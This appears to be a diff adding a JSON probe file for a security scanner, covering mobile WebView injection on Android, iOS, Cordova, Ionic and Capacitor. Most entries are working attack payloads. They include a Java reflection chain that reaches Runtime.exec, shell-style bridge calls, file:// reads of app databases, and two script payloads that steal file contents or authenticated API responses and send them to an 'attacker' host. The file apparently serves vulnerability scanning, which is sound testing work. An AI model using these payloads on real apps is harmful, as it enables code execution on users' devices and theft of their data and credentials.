@@ -1,0 +1,182 @@
+{
+  "category": "webview_injection",
+  "description": "Mobile WebView attacks: Android WebView (addJavascriptInterface RCE, file:// access, mixed-content), iOS WKWebView (postMessage handler abuse, file:// URL load), Cordova/Ionic bridge abuse, Capacitor plugins. Reference-only — requires device + ability to control WebView source URL or postMessage. Maps to OWASP Mobile Top 10 2024 M4 + HackTricks Mobile WebView section.",
+  "contexts": {
+    "addjavascriptinterface_rce": {
+      "description": "Android WebView with addJavascriptInterface() and target SDK <17 (or any version with @JavascriptInterface annotation on methods returning Java reflection access) → loaded JS can invoke any Java method. Reaches Runtime.exec → RCE inside app sandbox.",
+      "tech_match": ["android", "webview"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "javascript:bridge.getClass().forName('java.lang.Runtime').getMethod('exec',[java.lang.String]).invoke(bridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id');",
+          "description": "Classic reflection chain — works when bridge object exposed without method allowlist. 'bridge' is whatever name addJavascriptInterface() registered.",
+          "matchers": [
+            {"type": "literal", "pattern": "addJavascriptInterface"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        },
+        {
+          "payload": "javascript:bridge.executeShell('whoami')",
+          "description": "Direct method invocation when bridge exposes shell-style helpers — happens in remote-config / debugging interfaces shipped to prod",
+          "matchers": [
+            {"type": "literal", "pattern": "bridge."}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    },
+    "webview_file_url_access": {
+      "description": "WebView with setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true) — JS loaded from file:// can read every file in app sandbox via XHR. Pre-API-30 default = both true.",
+      "tech_match": ["android", "webview"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "file:///data/data/com.victim.app/databases/users.db",
+          "description": "Direct file:// load. Frida hook on WebView.loadUrl logs every call — if attacker can influence loadUrl param, exfil entire app sandbox.",
+          "matchers": [
+            {"type": "literal", "pattern": "file://"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "<script>fetch('file:///etc/hosts').then(r=>r.text()).then(t=>fetch('https://attacker/?d='+btoa(t)))</script>",
+          "description": "JS payload running inside file:// origin reads arbitrary host files",
+          "matchers": [
+            {"type": "literal", "pattern": "fetch('file://"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "wkwebview_message_handler": {
+      "description": "iOS WKWebView with WKScriptMessageHandler — JS posts via window.webkit.messageHandlers.<name>.postMessage(). If app dispatches messages back to native APIs without origin/auth validation, attacker JS triggers privileged native actions.",
+      "tech_match": ["ios", "wkwebview"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "window.webkit.messageHandlers.bridge.postMessage({action:'openExternalURL',url:'malicious://'})",
+          "description": "Trigger native message handler with attacker payload — works if WKWebView source URL not locked to app-bundle scheme",
+          "matchers": [
+            {"type": "literal", "pattern": "messageHandlers"}
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "window.webkit.messageHandlers.bridge.postMessage({action:'exec',cmd:'id'})",
+          "description": "Probe for exec-style handlers — happens in legacy hybrid apps that exposed dev tooling",
+          "matchers": [
+            {"type": "literal", "pattern": "messageHandlers"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "wkwebview_universal_xss": {
+      "description": "WKWebView with WebKitWebProcessPlugInScriptWorld or WKUserContentController where attacker-loaded content escapes origin — CVE-2019-8506-class universal XSS. Mostly patched but still appears in pinned-WebKit-version apps.",
+      "tech_match": ["ios", "wkwebview"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<iframe src='javascript:alert(document.domain)'></iframe>",
+          "description": "Test javascript: scheme handling in nested frame — should be blocked; if alert fires showing different origin, UXSS condition",
+          "matchers": [
+            {"type": "literal", "pattern": "javascript:"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "cordova_ionic_plugin_abuse": {
+      "description": "Cordova/Ionic apps expose JS-callable plugins via cordova.exec(success,fail,'PluginName','method',[args]). Plugin allowlist in config.xml controls which plugins reachable from JS. Misconfigured wildcards allow plugin enumeration + abuse.",
+      "tech_match": ["cordova", "ionic", "phonegap"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "cordova.exec(null,null,'File','readAsText',['file:///etc/hosts'])",
+          "description": "Cordova File plugin — read arbitrary file if allowlist permissive",
+          "matchers": [
+            {"type": "literal", "pattern": "cordova.exec"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "cordova.exec(null,null,'InAppBrowser','open',['javascript:document.body.innerHTML',null,null])",
+          "description": "InAppBrowser plugin reaching javascript: URL — UXSS into app browser",
+          "matchers": [
+            {"type": "literal", "pattern": "InAppBrowser"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "capacitor_plugin_default": {
+      "description": "Capacitor exposes plugins under Capacitor.Plugins.<Name>. Plugins like Filesystem, App, Browser can be misused if the WebView allowed-origins list doesn't restrict third-party content.",
+      "tech_match": ["capacitor", "ionic"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Capacitor.Plugins.Filesystem.readFile({path:'docs.txt',directory:'DOCUMENTS'})",
+          "description": "Capacitor Filesystem plugin call from attacker-loaded JS",
+          "matchers": [
+            {"type": "literal", "pattern": "Capacitor.Plugins"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "webview_mixed_content_load": {
+      "description": "Android WebView with setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW) — HTTPS app page loads HTTP subresources without TLS. Attacker on same network injects JS into the WebView's origin.",
+      "tech_match": ["android", "webview"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<script src='http://victim-cdn.example/cdn.js'></script>",
+          "description": "If WebView loads HTTP script in HTTPS page, network attacker rewrites response to attacker JS",
+          "matchers": [
+            {"type": "literal", "pattern": "http://"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "webview_screenshot_token_capture": {
+      "description": "WebView reflects bearer tokens / cookies into JS context. Attacker JS in WebView can read auth via document.cookie / localStorage / fetch('/me') — same-origin to app's API.",
+      "tech_match": ["android", "ios", "webview"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "<script>fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://attacker/?t='+btoa(t)))</script>",
+          "description": "JS in WebView origin → reads app's authenticated API + exfils. Possible whenever attacker controls any HTML loaded inside that WebView.",
+          "matchers": [
+            {"type": "literal", "pattern": "credentials:"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
